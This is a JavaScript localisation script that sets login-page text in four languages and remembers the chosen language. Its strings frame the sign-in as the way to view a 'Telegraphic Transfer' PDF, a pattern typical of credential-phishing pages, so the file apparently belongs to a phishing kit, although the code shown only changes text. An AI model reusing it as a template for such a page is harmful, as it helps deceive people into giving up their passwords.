const translations = {
    en: {
        pageTitle: 'Login',
        emailLabel: 'Email Address',
        passwordLabel: 'Password',
        rememberLabel: 'Remember me',
        continueBtn: 'Continue',
        submitBtn: 'Sign In',
        forgotLink: 'Forgot Password?',
        signupText: "Don't have an account?",
        signupLink: 'Sign up',
        viewPdfText: 'View Telegraphic Transfer',
        viewPdfLink: 'View PDF',
        emailError: 'Please enter a valid email address',
        passwordError: 'Password must be at least 6 characters',
        successText: 'Login successful! Redirecting...',
        loginAlert: 'Login successful for: ',
        changeEmail: 'Change'
    },
    es: {
        pageTitle: 'Iniciar Sesión',
        emailLabel: 'Correo Electrónico',
        passwordLabel: 'Contraseña',
        rememberLabel: 'Recuérdame',
        continueBtn: 'Continuar',
        submitBtn: 'Iniciar Sesión',
        forgotLink: '¿Olvidaste tu Contraseña?',
        signupText: '¿No tienes una cuenta?',
        signupLink: 'Regístrate',
        viewPdfText: 'Ver Transferencia Telegráfica',
        viewPdfLink: 'Ver PDF',
        emailError: 'Por favor ingresa un correo electr��nico válido',
        passwordError: 'La contraseña debe tener al menos 6 caracteres',
        successText: '¡Inicio de sesión exitoso! Redirigiendo...',
        loginAlert: 'Inicio de sesión exitoso para: ',
        changeEmail: 'Cambiar'
    },
    fr: {
        pageTitle: 'Connexion',
        emailLabel: 'Adresse Email',
        passwordLabel: 'Mot de passe',
        rememberLabel: 'Se souvenir de moi',
        continueBtn: 'Continuer',
        submitBtn: 'Se Connecter',
        forgotLink: 'Mot de passe oublié?',
        signupText: 'Vous n\'avez pas de compte?',
        signupLink: 'S\'inscrire',
        viewPdfText: 'Voir le Virement Télégraphique',
        viewPdfLink: 'Voir le PDF',
        emailError: 'Veuillez entrer une adresse email valide',
        passwordError: 'Le mot de passe doit contenir au moins 6 caractères',
        successText: 'Connexion réussie! Redirection...',
        loginAlert: 'Connexion réussie pour: ',
        changeEmail: 'Modifier'
    },
    zh: {
        pageTitle: '登录',
        emailLabel: '电子邮件地址',
        passwordLabel: '密码',
        rememberLabel: '记住我',
        continueBtn: '继续',
        submitBtn: '登录',
        forgotLink: '忘记密码?',
        signupText: '没有账户?',
        signupLink: '注册',
        viewPdfText: '查看电汇单',
        viewPdfLink: '查看PDF',
        emailError: '请输入有效的电子邮件地址',
        passwordError: '密码必须至少为6个字符',
        successText: '登录成功!正在重定向...',
        loginAlert: '成功登录: ',
        changeEmail: '修改'
    }
};

function setLanguage(lang) {
    localStorage.setItem('preferredLanguage', lang);
    
    document.getElementById('pageTitle').textContent = translations[lang].pageTitle;
    document.getElementById('emailLabel').textContent = translations[lang].emailLabel;
    document.getElementById('passwordLabel').textContent = translations[lang].passwordLabel;
    document.getElementById('rememberLabel').textContent = translations[lang].rememberLabel;
    document.getElementById('continueBtn').textContent = translations[lang].continueBtn;
    document.getElementById('submitBtn').textContent = translations[lang].submitBtn;
    document.getElementById('forgotLink').textContent = translations[lang].forgotLink;
    document.getElementById('signupText').textContent = translations[lang].signupText;
    document.getElementById('signupLink').textContent = translations[lang].signupLink;
    document.getElementById('viewPdfText').textContent = translations[lang].viewPdfText;
    document.getElementById('viewPdfLink').textContent = translations[lang].viewPdfLink;
    document.getElementById('emailError').textContent = translations[lang].emailError;
    document.getElementById('passwordError').textContent = translations[lang].passwordError;
    document.getElementById('successText').textContent = translations[lang].successText;
    document.getElementById('changeEmailLink').textContent = translations[lang].changeEmail;
    
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.classList.remove('active');
        if (btn.dataset.lang === lang) {
            btn.classList.add('active');
        }
    });
    
    window.currentLanguage = lang;
}

document.addEventListener('DOMContentLoaded', function() {
    const preferredLang = localStorage.getItem('preferredLanguage') || 'en';
    setLanguage(preferredLang);
    
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            setLanguage(this.dataset.lang);
        });
    });
});